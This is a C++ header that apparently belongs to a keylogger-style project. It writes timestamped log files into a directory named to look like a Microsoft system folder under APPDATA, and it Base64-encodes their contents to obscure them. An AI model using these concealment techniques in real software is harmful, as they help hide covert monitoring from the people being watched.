#ifndef _INPUTOUTPUT_H_
#define _INPUTOUTPUT_H_

#include <string>
#include <cstdlib>
#include <windows.h>
#include <fstream>
#include "helper.h"
#include "base64.h"

namespace inputOutput
{
	std::string getOurPath(const bool appendSeperator = false)
	{
		std::string appdata_dir(getenv("APPDATA"));
		std::string full = appdata_dir + "\\Microsoft\\CLR";

		return full + (appendSeperator ? "\\" : "");
	}

	bool makeOneDir(std::string path)
	{
		return (bool)CreateDirectory(path.c_str(), NULL) ||
			GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool makeDir(std::string path)
	{
		for (char &charHolder : path)
		{
			if (charHolder == '\\')
			{
				charHolder = '\0';

				if (!makeOneDir(path))
				{
					return false;
				}

				charHolder = '\\';
			}
		}

		return true;
	}

	template <class T>

	std::string writeLog(const T &str)
	{
		std::string path = getOurPath(true);
		Helper::DateTime dt;
		std::string name = dt.getDateTimeString("_") + ".log";

		try
		{
			std::ofstream outFile(path + name);

			if (!outFile) { return ""; }

			std::ostringstream outStr;

			outStr << "[" << dt.getDateTimeString() << "]" <<
				std::endl << str << std::endl;

			std::string data = Base64::encryptBase64(outStr.str());

			outFile << data;

			if (!outFile) { return ""; }

			outFile.close();
			return name;
		}
		catch (...)
		{
			return "";
		}
	}
}

#endif // _INPUTOUTPUT_H_